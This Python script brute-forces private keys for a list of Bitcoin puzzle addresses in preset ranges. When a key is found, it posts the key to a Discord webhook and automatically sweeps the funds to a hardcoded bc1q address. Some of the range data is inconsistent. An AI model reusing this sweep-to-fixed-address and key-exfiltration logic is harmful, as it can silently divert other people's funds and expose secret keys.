import os
import time
import multiprocessing as mp
import hashlib
import coincurve
import random
import requests
from requests.exceptions import RequestException
from bitcoinlib.wallets import Wallet
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Retrieve the webhook URLs from the environment variables
DISCORD_STATUS_WEBHOOK_URL = os.getenv('DISCORD_STATUS_WEBHOOK_URL')
DISCORD_ALERTS_WEBHOOK_URL = os.getenv('DISCORD_ALERTS_WEBHOOK_URL')

challenges = [
        {
            "id": 1,
            "pk_range_start": "1",
            "pk_range_end": "1",
            "address": "1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH",
            "prize": 0.24778163
        },
        {
            "id": 2,
            "pk_range_start": "2",
            "pk_range_end": "3",
            "address": "1CUNEBjYrCn2y1SdiUMohaKUi4wpP326Lb",
            "prize": 0.00226546
        },
        {
            "id": 3,
            "pk_range_start": "4",
            "pk_range_end": "7",
            "address": "19ZewH8Kk1PDbSNdJ97FP4EiCjTRaZMZQA",
            "prize": 0.0031
        },
        {
            "id": 4,
            "pk_range_start": "8",
            "pk_range_end": "f",
            "address": "1EhqbyUMvvs7BfL8goY6qcPbD6YKfPqb7e",
            "prize": 0.00401601
        },
        {
            "id": 5,
            "pk_range_start": "10",
            "pk_range_end": "1f",
            "address": "1E6NuFjCi27W5zoXg8TRdcSRq84zJeBW3k",
            "prize": 0.005
        },
        {
            "id": 6,
            "pk_range_start": "20",
            "pk_range_end": "3f",
            "address": "1PitScNLyp2HCygzadCh7FveTnfmpPbfp8",
            "prize": 0.00618097
        },
        {
            "id": 7,
            "pk_range_start": "40",
            "pk_range_end": "7f",
            "address": "1McVt1vMtCC7yn5b9wgX1833yCcLXzueeC",
            "prize": 0.007
        },
        {
            "id": 8,
            "pk_range_start": "80",
            "pk_range_end": "ff",
            "address": "1M92tSqNmQLYw33fuBvjmeadirh1ysMBxK",
            "prize": 0.008
        },
        {
            "id": 9,
            "pk_range_start": "100",
            "pk_range_end": "1ff",
            "address": "1CQFwcjw1dwhtkVWBttNLDtqL7ivBonGPV",
            "prize": 0.018
        },
        {
            "id": 10,
            "pk_range_start": "200",
            "pk_range_end": "3ff",
            "address": "1LeBZP5QCwwgXRtmVUvTVrraqPUokyLHqe",
            "prize": 0.01012795
        },
        {
            "id": 11,
            "pk_range_start": "400",
            "pk_range_end": "7ff",
            "address": "1PgQVLmst3Z314JrQn5TNiys8Hc38TcXJu",
            "prize": 0.011
        },
        {
            "id": 12,
            "pk_range_start": "800",
            "pk_range_end": "fff",
            "address": "1DBaumZxUkM4qMQRt2LVWyFJq5kDtSZQot",
            "prize": 0.01200961
        },
        {
            "id": 13,
            "pk_range_start": "1000",
            "pk_range_end": "1fff",
            "address": "1Pie8JkxBT6MGPz9Nvi3fsPkr2D8q3GBc1",
            "prize": 0.013
        },
        {
            "id": 14,
            "pk_range_start": "2000",
            "pk_range_end": "3fff",
            "address": "1ErZWg5cFCe4Vw5BzgfzB74VNLaXEiEkhk",
            "prize": 0.014
        },
        {
            "id": 15,
            "pk_range_start": "4000",
            "pk_range_end": "7fff",
            "address": "1QCbW9HWnwQWiQqVo5exhAnmfqKRrCRsvW",
            "prize": 0.015
        },
        {
            "id": 16,
            "pk_range_start": "8000",
            "pk_range_end": "ffff",
            "address": "1BDyrQ6WoF8VN3g9SAS1iKZcPzFfnDVieY",
            "prize": 0.01601
        },
        {
            "id": 17,
            "pk_range_start": "10000",
            "pk_range_end": "1ffff",
            "address": "1HduPEXZRdG26SUT5Yk83mLkPyjnZuJ7Bm",
            "prize": 0.017
        },
        {
            "id": 18,
            "pk_range_start": "20000",
            "pk_range_end": "3ffff",
            "address": "1GnNTmTVLZiqQfLbAdp9DVdicEnB5GoERE",
            "prize": 0.018
        },
        {
            "id": 19,
            "pk_range_start": "40000",
            "pk_range_end": "7ffff",
            "address": "1NWmZRpHH4XSPwsW6dsS3nrNWfL1yrJj4w",
            "prize": 0.019
        },
        {
            "id": 20,
            "pk_range_start": "80000",
            "pk_range_end": "fffff",
            "address": "1HsMJxNiV7TLxmoF6uJNkydxPFDog4NQum",
            "prize": 0.02
        },
        {
            "id": 21,
            "pk_range_start": "100000",
            "pk_range_end": "1fffff",
            "address": "14oFNXucftsHiUMY8uctg6N487riuyXs4h",
            "prize": 0.02201813
        },
        {
            "id": 22,
            "pk_range_start": "200000",
            "pk_range_end": "3fffff",
            "address": "1CfZWK1QTQE3eS9qn61dQjV89KDjZzfNcv",
            "prize": 0.022
        },
        {
            "id": 23,
            "pk_range_start": "400000",
            "pk_range_end": "7fffff",
            "address": "1L2GM8eE7mJWLdo3HZS6su1832NX2txaac",
            "prize": 0.023
        },
        {
            "id": 24,
            "pk_range_start": "800000",
            "pk_range_end": "ffffff",
            "address": "1rSnXMr63jdCuegJFuidJqWxUPV7AtUf7",
            "prize": 0.024
        },
        {
            "id": 25,
            "pk_range_start": "1000000",
            "pk_range_end": "1ffffff",
            "address": "15JhYXn6Mx3oF4Y7PcTAv2wVVAuCFFQNiP",
            "prize": 0.025
        },
        {
            "id": 26,
            "pk_range_start": "2000000",
            "pk_range_end": "3ffffff",
            "address": "1JVnST957hGztonaWK6FougdtjxzHzRMMg",
            "prize": 0.026
        },
        {
            "id": 27,
            "pk_range_start": "4000000",
            "pk_range_end": "7ffffff",
            "address": "128z5d7nN7PkCuX5qoA4Ys6pmxUYnEy86k",
            "prize": 0.027
        },
        {
            "id": 28,
            "pk_range_start": "8000000",
            "pk_range_end": "fffffff",
            "address": "12jbtzBb54r97TCwW3G1gCFoumpckRAPdY",
            "prize": 0.028
        },
        {
            "id": 29,
            "pk_range_start": "10000000",
            "pk_range_end": "1fffffff",
            "address": "19EEC52krRUK1RkUAEZmQdjTyHT7Gp1TYT",
            "prize": 0.029
        },
        {
            "id": 30,
            "pk_range_start": "20000000",
            "pk_range_end": "3fffffff",
            "address": "1LHtnpd8nU5VHEMkG2TMYYNUjjLc992bps",
            "prize": 0.0303
        },
        {
            "id": 31,
            "pk_range_start": "40000000",
            "pk_range_end": "7fffffff",
            "address": "1LhE6sCTuGae42Axu1L1ZB7L96yi9irEBE",
            "prize": 0.031
        },
        {
            "id": 32,
            "pk_range_start": "80000000",
            "pk_range_end": "ffffffff",
            "address": "1FRoHA9xewq7DjrZ1psWJVeTer8gHRqEvR",
            "prize": 0.032
        },
        {
            "id": 33,
            "pk_range_start": "100000000",
            "pk_range_end": "1ffffffff",
            "address": "187swFMjz1G54ycVU56B7jZFHFTNVQFDiu",
            "prize": 0.033
        },
        {
            "id": 34,
            "pk_range_start": "200000000",
            "pk_range_end": "3ffffffff",
            "address": "1PWABE7oUahG2AFFQhhvViQovnCr4rEv7Q",
            "prize": 0.034
        },
        {
            "id": 35,
            "pk_range_start": "400000000",
            "pk_range_end": "7ffffffff",
            "address": "1PWCx5fovoEaoBowAvF5k91m2Xat9bMgwb",
            "prize": 0.035
        },
        {
            "id": 36,
            "pk_range_start": "800000000",
            "pk_range_end": "fffffffff",
            "address": "1Be2UF9NLfyLFbtm3TCbmuocc9N1Kduci1",
            "prize": 0.036
        },
        {
            "id": 37,
            "pk_range_start": "1000000000",
            "pk_range_end": "1fffffffff",
            "address": "14iXhn8bGajVWegZHJ18vJLHhntcpL4dex",
            "prize": 0.037
        },
        {
            "id": 38,
            "pk_range_start": "2000000000",
            "pk_range_end": "3fffffffff",
            "address": "1HBtApAFA9B2YZw3G2YKSMCtb3dVnjuNe2",
            "prize": 0.038
        },
        {
            "id": 39,
            "pk_range_start": "4000000000",
            "pk_range_end": "7fffffffff",
            "address": "122AJhKLEfkFBaGAd84pLp1kfE7xK3GdT8",
            "prize": 0.03901
        },
        {
            "id": 40,
            "pk_range_start": "8000000000",
            "pk_range_end": "ffffffffff",
            "address": "1EeAxcprB2PpCnr34VfZdFrkUWuxyiNEFv",
            "prize": 0.04
        },
        {
            "id": 41,
            "pk_range_start": "10000000000",
            "pk_range_end": "1ffffffffff",
            "address": "1L5sU9qvJeuwQUdt4y1eiLmquFxKjtHr3E",
            "prize": 0.041
        },
        {
            "id": 42,
            "pk_range_start": "20000000000",
            "pk_range_end": "3ffffffffff",
            "address": "1E32GPWgDyeyQac4aJxm9HVoLrrEYPnM4N",
            "prize": 0.042
        },
        {
            "id": 43,
            "pk_range_start": "40000000000",
            "pk_range_end": "7ffffffffff",
            "address": "1PiFuqGpG8yGM5v6rNHWS3TjsG6awgEGA1",
            "prize": 0.043
        },
        {
            "id": 44,
            "pk_range_start": "80000000000",
            "pk_range_end": "fffffffffff",
            "address": "1CkR2uS7LmFwc3T2jV8C1BhWb5mQaoxedF",
            "prize": 0.044
        },
        {
            "id": 45,
            "pk_range_start": "100000000000",
            "pk_range_end": "1fffffffffff",
            "address": "1NtiLNGegHWE3Mp9g2JPkgx6wUg4TW7bbk",
            "prize": 0.045
        },
        {
            "id": 46,
            "pk_range_start": "200000000000",
            "pk_range_end": "3fffffffffff",
            "address": "1F3JRMWudBaj48EhwcHDdpeuy2jwACNxjP",
            "prize": 0.046
        },
        {
            "id": 47,
            "pk_range_start": "400000000000",
            "pk_range_end": "7fffffffffff",
            "address": "1Pd8VvT49sHKsmqrQiP61RsVwmXCZ6ay7Z",
            "prize": 0.0473496
        },
        {
            "id": 48,
            "pk_range_start": "800000000000",
            "pk_range_end": "ffffffffffff",
            "address": "1DFYhaB2J9q1LLZJWKTnscPWos9VBqDHzv",
            "prize": 0.048
        },
        {
            "id": 49,
            "pk_range_start": "1000000000000",
            "pk_range_end": "1ffffffffffff",
            "address": "12CiUhYVTTH33w3SPUBqcpMoqnApAV4WCF",
            "prize": 0.049
        },
        {
            "id": 50,
            "pk_range_start": "2000000000000",
            "pk_range_end": "3ffffffffffff",
            "address": "1MEzite4ReNuWaL5Ds17ePKt2dCxWEofwk",
            "prize": 0.05000546
        },
        {
            "id": 51,
            "pk_range_start": "4000000000000",
            "pk_range_end": "7ffffffffffff",
            "address": "1NpnQyZ7x24ud82b7WiRNvPm6N8bqGQnaS",
            "prize": 0.10171886
        },
        {
            "id": 52,
            "pk_range_start": "8000000000000",
            "pk_range_end": "fffffffffffff",
            "address": "15z9c9sVpu6fwNiK7dMAFgMYSK4GqsGZim",
            "prize": 0.052
        },
        {
            "id": 53,
            "pk_range_start": "10000000000000",
            "pk_range_end": "1fffffffffffff",
            "address": "15K1YKJMiJ4fpesTVUcByoz334rHmknxmT",
            "prize": 0.53
        },
        {
            "id": 54,
            "pk_range_start": "20000000000000",
            "pk_range_end": "3fffffffffffff",
            "address": "1KYUv7nSvXx4642TKeuC2SNdTk326uUpFy",
            "prize": 0.54002
        },
        {
            "id": 55,
            "pk_range_start": "40000000000000",
            "pk_range_end": "7fffffffffffff",
            "address": "1LzhS3k3e9Ub8i2W1V8xQFdB8n2MYCHPCa",
            "prize": 0.60011515
        },
        {
            "id": 56,
            "pk_range_start": "80000000000000",
            "pk_range_end": "ffffffffffffff",
                        "address": "17aPYR1m6pVAacXg1PTDDU7XafvK1dxvhi",
            "prize": 0.71343285
        },
        {
            "id": 57,
            "pk_range_start": "100000000000000",
            "pk_range_end": "1ffffffffffffff",
            "address": "15c9mPGLku1HuW9LRtBf4jcHVpBUt8txKz",
            "prize": 0.57038752
        },
        {
            "id": 58,
            "pk_range_start": "200000000000000",
            "pk_range_end": "3ffffffffffffff",
            "address": "1Dn8NF8qDyyfHMktmuoQLGyjWmZXgvosXf",
            "prize": 0.58
        },
        {
            "id": 59,
            "pk_range_start": "400000000000000",
            "pk_range_end": "7ffffffffffffff",
            "address": "1HAX2n9Uruu9YDt4cqRgYcvtGvZj1rbUyt",
            "prize": 0.59041
        },
        {
            "id": 60,
            "pk_range_start": "800000000000000",
            "pk_range_end": "fffffffffffffffff",
            "address": "1Kn5h2qpgw9mWE5jKpk8PP4qvvJ1QVy8su",
            "prize": 0.600015
        },
        {
            "id": 61,
            "pk_range_start": "1000000000000000",
            "pk_range_end": "1fffffffffffffffff",
            "address": "1AVJKwzs9AskraJLGHAZPiaZcrpDr1U6AB",
            "prize": 0.61000793
        },
        {
            "id": 62,
            "pk_range_start": "2000000000000000",
            "pk_range_end": "3fffffffffffffffff",
            "address": "1Me6EfpwZK5kQziBwBfvLiHjaPGxCKLoJi",
            "prize": 0.620091
        },
        {
            "id": 63,
            "pk_range_start": "4000000000000000",
            "pk_range_end": "7fffffffffffffffff",
            "address": "1NpYjtLira16LfGbGwZJ5JbDPh3ai9bjf4",
            "prize": 0.63004413
        },
        {
            "id": 64,
            "pk_range_start": "8000000000000000",
            "pk_range_end": "fffffffffffffffffff",
            "address": "16jY7qLJnxb7CHZyqBP8qca9d51gAjyXQN",
            "prize": 0.64040459
        },
        {
            "id": 65,
            "pk_range_start": "10000000000000000",
            "pk_range_end": "1fffffffffffffffffff",
            "address": "18ZMbwUFLMHoZBbfpCjUJQTCMCbktshgpe",
            "prize": 0.65012839
        },
        {
            "id": 66,
            "pk_range_start": "20000000000000000",
            "pk_range_end": "3fffffffffffffffffff",
            "address": "13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so",
            "prize": 6.60127262
        },
        {
            "id": 67,
            "pk_range_start": "40000000000000000",
            "pk_range_end": "7ffffffffffffffff",
            "address": "1BY8GQbnueYofwSuFAT3USAhGjPrkxDdW9",
            "prize": 6.70004315
        },
        {
            "id": 68,
            "pk_range_start": "80000000000000000",
            "pk_range_end": "fffffffffffffffff",
            "address": "1MVDYgVaSN6iKKEsbzRUAYFrYJadLYZvvZ",
            "prize": 6.80005314
        },
        {
            "id": 69,
            "pk_range_start": "100000000000000000",
            "pk_range_end": "1fffffffffffffffff",
            "address": "19vkiEajfhuZ8bs8Zu2jgmC6oqZbWqhxhG",
            "prize": 6.90013061
        },
        {
            "id": 70,
            "pk_range_start": "200000000000000000",
            "pk_range_end": "3fffffffffffffffff",
            "address": "19YZECXj3SxEZMoUeJ1yiPsw8xANe7M7QR",
            "prize": 0.70071362
        },
        {
            "id": 71,
            "pk_range_start": "400000000000000000",
            "pk_range_end": "7fffffffffffffffff",
            "address": "1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU",
            "prize": 7.1000377
        },
        {
            "id": 72,
            "pk_range_start": "800000000000000000",
            "pk_range_end": "ffffffffffffffffff",
            "address": "1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR",
            "prize": 7.20003779
        },
        {
            "id": 73,
            "pk_range_start": "1000000000000000000",
            "pk_range_end": "1ffffffffffffffffff",
            "address": "12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4",
            "prize": 7.30003777
        },
        {
            "id": 74,
            "pk_range_start": "2000000000000000000",
            "pk_range_end": "3ffffffffffffffffff",
            "address": "1FWGcVDK3JGzCC3WtkYetULPszMaK2Jksv",
            "prize": 7.40003777
        },
       
    ]

BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def base58_encode(b):
    n = int.from_bytes(b, 'big')
    res = ''
    while n > 0:
        n, r = divmod(n, 58)
        res = BASE58_ALPHABET[r] + res
    # Add '1' for each leading 0 byte
    leading_zero_bytes = len(b) - len(b.lstrip(b'\0'))
    return '1' * leading_zero_bytes + res

# Function to select the challenge and offset
def select_challenge(challenges):
    print("Select a challenge by its number:")
    for challenge in reversed(challenges):
        print(f"#{challenge['id']}: {challenge['address']} (Prize: {challenge['prize']} BTC)")
    challenge_number = int(input("\nEnter challenge number: "))

    max_cores = os.cpu_count()
    num_cores = int(input(f"\nEnter the number of cores you'd like to use ({max_cores} max): "))

    percentage = float(input("\nEnter the percentage of the key range to skip to (e.g., 52.2421): "))

    selected_challenge = next((ch for ch in challenges if ch['id'] == challenge_number), None)
    if selected_challenge:
        print(f"\nChallenge #{selected_challenge['id']} Details:")
        print(f"Address: {selected_challenge['address']}")
        print(f"Prize: {selected_challenge['prize']} BTC")
        print(f"Private Key Range: {selected_challenge['pk_range_start']}...{selected_challenge['pk_range_end']}")
        print(f"Starting at {percentage}% of the key range.")
    return selected_challenge, num_cores, percentage

# Optimized pubkey to address conversion
def pubkey_to_address(pubkey):
    sha256_bpk = hashlib.sha256(pubkey).digest()
    ripemd160_bpk = hashlib.new('ripemd160', sha256_bpk).digest()
    versioned_payload = b'\x00' + ripemd160_bpk
    checksum = hashlib.sha256(hashlib.sha256(versioned_payload).digest()).digest()[:4]
    return base58_encode(versioned_payload + checksum)

def send_discord_message(webhook_url, message):
    try:
        data = {"content": message}
        response = requests.post(webhook_url, json=data)
        response.raise_for_status()
        print("\nDiscord message sent successfully!")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send Discord message: {e}")

def check_balance_and_send(address, private_key):
    max_retries = 3
    retry_delay = 5  # seconds

    for attempt in range(max_retries):
        try:
            # Check balance using a block explorer API (e.g., Blockchain.info)
            response = requests.get(f"https://blockchain.info/q/addressbalance/{address}", timeout=10)
            response.raise_for_status()  # Raise an exception for bad status codes
            
            balance_satoshis = int(response.text)
            result = f"\nAddress balance: {balance_satoshis} satoshis\n"
            
            if balance_satoshis > 0:
                # Create a wallet using the found private key
                wallet = Wallet.create('found_wallet', keys=private_key, network='bitcoin')
                
                # Prepare the transaction
                target_address = 'bc1q2sp0vqcera6phf90x93nnxp3vhfw0hk5kkndh8'
                tx = wallet.send_to(target_address, balance_satoshis, fee='fast', offline=True)
                
                # Sign and push the transaction
                tx.sign()
                tx_id = tx.push()
                
                result += f"Transaction sent! Transaction ID: {tx_id}\n"
            else:
                pass
            
            return result
        
        except RequestException as e:
            if attempt < max_retries - 1:
                result = f"Error checking balance (attempt {attempt + 1}/{max_retries}): {str(e)}. Retrying in {retry_delay} seconds...\n"
                time.sleep(retry_delay)
            else:
                result = f"Failed to check balance after {max_retries} attempts: {str(e)}. Please verify manually.\n"
    
    return result

def process_sequential_keys(start, end, target_address, result_queue, discord_webhook_url):
    range_size = end - start + 1
    privkey_int = start + random.randrange(range_size)
    initial_start = privkey_int
    total_checked = 0

    while True:
        privkey_bytes = privkey_int.to_bytes(32, 'big')
        try:
            pubkey_point = coincurve.PublicKey.from_valid_secret(privkey_bytes)
            pubkey_bytes = pubkey_point.format(compressed=True)
            
            if pubkey_to_address(pubkey_bytes) == target_address:
                # Send Discord message before checking balance
                print(f"\n\033[92mPRIVATE KEY FOUND!: \npk: {privkey_bytes.hex()}\naddress: {target_address}\033[0m")
                discord_message = f"Private key found!\n\nPrivate Key: {privkey_bytes.hex()}\n\nAddress: {target_address}"
                send_discord_message(discord_webhook_url, discord_message)
                
                balance_result = check_balance_and_send(target_address, privkey_bytes.hex())
                send_discord_message(discord_webhook_url, balance_result)

                
                result_queue.put(('found', privkey_int, balance_result))
                return

            privkey_int += 1
            if privkey_int > end:
                privkey_int = start
            if privkey_int == initial_start:
                break

            total_checked += 1

            if total_checked % 1000 == 0:
                result_queue.put(('progress', total_checked))
                total_checked = 0

        except ValueError:
            # If we encounter an invalid private key, just move to the next one
            privkey_int += 1
            if privkey_int > end:
                privkey_int = start
        except Exception as e:
            result_queue.put(('error', str(e)))

    result_queue.put(('done',))

def find_private_key_sequential(start, end, target_address, num_processes, discord_webhook_url):
    result_queue = mp.Queue()

    total_range = end - start + 1
    chunk_size = total_range // num_processes
    processes = []
    for i in range(num_processes):
        chunk_start = start + i * chunk_size
        chunk_end = chunk_start + chunk_size - 1 if i < num_processes - 1 else end
        p = mp.Process(target=process_sequential_keys, args=(chunk_start, chunk_end, target_address, result_queue, discord_webhook_url))
        processes.append(p)
        p.start()
    start_time = time.time()
    last_check_time = start_time
    total_checked = 0

    try:
        active_processes = num_processes
        while active_processes > 0:
            try:
                result = result_queue.get(timeout=1)
                if result[0] == 'found':
                    for p in processes:
                        p.terminate()
                    return result[1], total_checked, time.time() - start_time, result[2]
                elif result[0] == 'progress':
                    total_checked += result[1]
                    current_time = time.time()
                    if current_time - last_check_time >= 10:
                        check_rate = total_checked / (current_time - start_time)
                        print(f"Keys checked: {total_checked:,}, "
                              f"Check rate: {check_rate:.2f} keys/second")
                        last_check_time = current_time
                elif result[0] == 'error':
                    print(f"Error: {result[1]}")
                elif result[0] == 'done':
                    active_processes -= 1
            except mp.queues.Empty:
                pass

    finally:
        for p in processes:
            p.terminate()

    return None, total_checked, time.time() - start_time, None

def main():
    try:
        selected_challenge, useable_cores, percentage = select_challenge(challenges)

        if selected_challenge:
            start_range = int(selected_challenge['pk_range_start'], 16)
            end_range = int(selected_challenge['pk_range_end'], 16)
            target_address = selected_challenge['address']

            total_range = end_range - start_range + 1
            offset = int((percentage / 100.0) * total_range)
            start_range += offset

            if start_range > end_range:
                print("\033[91mError: Starting percentage exceeds the key range.\033[0m")
                return

            max_processes = os.cpu_count()
            print(f"Using {useable_cores}/{max_processes} CPU cores")

            result, total_checked, total_time, balance_result = find_private_key_sequential(
                start_range, end_range, target_address, useable_cores, DISCORD_ALERTS_WEBHOOK_URL)

            if result:
                print(f"\033[92m\n{balance_result}\033[0m")
            else:
                print("\n\033[91mPrivate key not found in the given range.\033[0m")

            print(f"\033[92mTotal keys checked: {total_checked:,}")
            print(f"Total time elapsed: {total_time:.2f} seconds")
            print(f"Overall check rate: {total_checked / total_time:.2f} keys/second\033[0m")

    except KeyboardInterrupt:
        print("\n\033[93mScript interrupted by user. Exiting gracefully...\033[0m")
    except Exception as e:
        print(f"\n\033[91mAn unexpected error occurred: {str(e)}\033[0m")

if __name__ == "__main__":
    main()